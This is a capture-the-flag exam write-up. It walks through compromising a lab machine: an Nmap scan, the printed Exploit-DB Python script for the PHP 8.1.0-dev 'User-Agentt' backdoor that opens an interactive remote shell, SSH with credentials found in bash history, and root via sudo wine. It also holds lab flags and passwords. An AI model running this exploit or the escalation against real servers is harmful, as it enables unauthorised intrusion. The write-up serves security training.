# NPT2025 Exam - Machine 2

> Organised by: [0day](https://www.linkedin.com/company/zer0day-technology/about/)
>
> Challenge created by: UnShadow
>
> Solved with: [rydzze](https://github.com/rydzze)


# 🔍 Reconnaisance & Scanning

First, let’s start by enumerating the services running on the target server by using Nmap. For this, I used the command below, but you can use your preferences for this:
```
┌──(kali㉿kali)-[/mnt/…/0day/NPT2025/Exam/Machine2]
└─$
$ nmap -sVSC <TARGET-IP> -T5 -Pn -n -vvv -oA machine2scan
Nmap scan report for <TARGET-IP>
Host is up, received user-set (0.0017s latency).
Scanned at 2025-08-02 00:05:23 +08 for 18s
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON          VERSION
22/tcp   open  ssh     syn-ack ttl 128 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP4OvUJ0xKoulS7xOYz1485bm/ZBVN/86xLQvh7Gqa1DmEWz/eHP2C3MJQnqTFPOEh18FULOzj9fiehyzhd6CM7+qBZ/4B9b5RkOx7AL+S3aRIey4qQj7/k72PqMBkyfD2krjNOg7ZZe8z9o0A4VyeDljG6ukVFeN6PEtWWtdmmnVJztgzX0wPWPaO9GM5hITyvpIB/Y/IqueYR+ft2n5ROLLUfjFLezB+zSa6xkDPGiY9qMZBMXA/6oaaD3TV1x6jfTtZi+Aca0scDfOTJUVlSwZYaHrJQSNlKFJhniucqq/zxOnMIHjs/v1YXYCh0jlYDsb5J/NqTzEPMKkbtwn97T5/FQvsWDGJFTtxvCCrInmnUHB+cG8dSRYQZ763QoPxF/feDSNbrKjTv8D1K2EPhf1rBGQGIObgatVHNFclVWfuq7sn4x9olNnbsEogIQ5mbEq0mBlgOW5vowFxUkI60Ond4Dl7H4fkCeiPfngWFrT+6cQoNgA3HRKf6NtQeYs=
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNDNbes4gKOy7nXoXxW1kPwOX/vuxNkae5WSrIFu+ZD8OUIX5OK8e6o7IZDJAxn/ACAJL9Mm+tA44syyemA6C40=
|   256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINItrDSHbBfPB1CJosqklAQXN4/Mt++ocUqbiG861ZSG
80/tcp   open  http    syn-ack ttl 128 Apache httpd 2.4.56 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.56 (Debian)
8080/tcp open  http    syn-ack ttl 128 PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```


# 🕵🏻‍♂️ Vulnerability Assessment

We accessed the webpage on port <code>8080</code> through an HTTP proxy and saw a page showing “Zerodium”. The web server running on <code>PHP version 8.1.0-dev</code> with <code>Apache</code> on port <code>80</code>. This suggests a development or testing environment, and the “Zerodium” message might be a sign of a known vulnerability.

We used <code>searchsploit</code> to look for known vulnerabilities by searching with the keyword <code>PHP 8.1.0-dev</code>. From the results, we found a vulnerability which is <code>PHP 8.1.0-dev - ‘User-Agentt’ Remote Code Execution</code>. This means we can potentially exploit this version of PHP by sending a specially crafted request with a ‘User-Agentt’ header to execute code remotely on the server.
```
┌──(kali㉿kali)-[/mnt/…/0day/NPT2025/Exam/Machine2]
└─$ searchsploit PHP 8.1.0-dev
.
.
.
OPNsense < 19.1.1 - Cross-Site Scripting                   | php/webapps/46351.txt
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution        | php/webapps/49933.py
PHP < 8.3.8 - Remote Code Execution (Unauthenticated) (Win | php/webapps/52047.py
.
.
.
```

This PoC exploits a hidden backdoor in <code>PHP 8.1.0-dev</code>, specifically through the use of a fake HTTP header called ‘User-Agentt’. In this vulnerable version, the backdoor allows remote code execution when a request includes the User-Agentt header containing a call to the function <code>zerodiumsystem()</code>. The exploit leverages this by sending system commands through that header, which the server then executes, giving the attacker remote control over the system.

Exploit script for remote code execution:
```python
# Exploit Title: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
# Date: 23 may 2021
# Exploit Author: flast101
# Vendor Homepage: https://www.php.net/
# Software Link: 
#     - https://hub.docker.com/r/phpdaily/php
#    - https://github.com/phpdaily/php
# Version: 8.1.0-dev
# Tested on: Ubuntu 20.04
# References:
#    - https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
#   - https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md

"""
Blog: https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
Download: https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py
Contact: flast101.sec@gmail.com

An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
The following exploit uses the backdoor to provide a pseudo shell ont the host.
"""

#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
```

Retrieve the script before we can use it:
```
┌──(kali㉿kali)-[/mnt/…/0day/NPT2025/Exam/Machine2]
└─$ cp /usr/share/exploitdb/exploits/php/webapps/49933.py /PATH/TO/DIRECTORY/zerodium_exploit.py
```


# 👾 Exploitation

We ran the script and connected to the target at http://&lt;TARGET-IP&gt;:8080/. The script successfully opened an interactive pseudo shell by abusing the **User-Agentt header backdoor** in <code>PHP 8.1.0-dev</code>. After gaining access, we confirmed we had root privileges by running <code>whoami</code>. We then listed the contents of the <code>/root</code> directory and found a <code>.bash_history</code> file, which contained a saved SSH command with credentials, username <code>liam</code> and password <code>L14mD0ck3Rp0w4</code>. This indicates the target is compromised, and we now have a **potential SSH credential**. 

We used the credentials found earlier to **SSH into the target machine** as the user <code>liam</code> at <TARGET-IP>. After confirming the host’s authenticity and providing the password, we successfully gained access to the system. Once logged in, we navigated to Liam’s home directory and read all files using <code>cat *</code>, revealing the user flag.

<details>
<summary><b>🏳️user.txt</b></summary>
<b>NPT{liam_3sc4l4t3d}</b>
</details><br>


# 💀 Privilege Escalation

Moving on to escalate our privileges to root. We need to find what we can leverage to spawn a privilege shell.

First, we need to try checking the sudo permissions available for the user:
```
$ sudo -l
.
.
.
User liam may run the following commands on 0day2:
    (root) NOPASSWD: /usr/bin/wine
```

So, what is **Wine** actually?

Wine is a software which we are able to run Windows applications in Linux. Therefore, to get to root privilege, we can use wine to open a root <code>cmd</code> by running the command:
```
$ sudo /usr/bin/wine cmd
```

We will able to run <code>cmd</code> as the root user. Retrieve the root flag.

<details>
<summary><b>🏳️root.txt</b></summary>
<b>NPT{r00t_m4st3ry_0day}</b>
</details><br>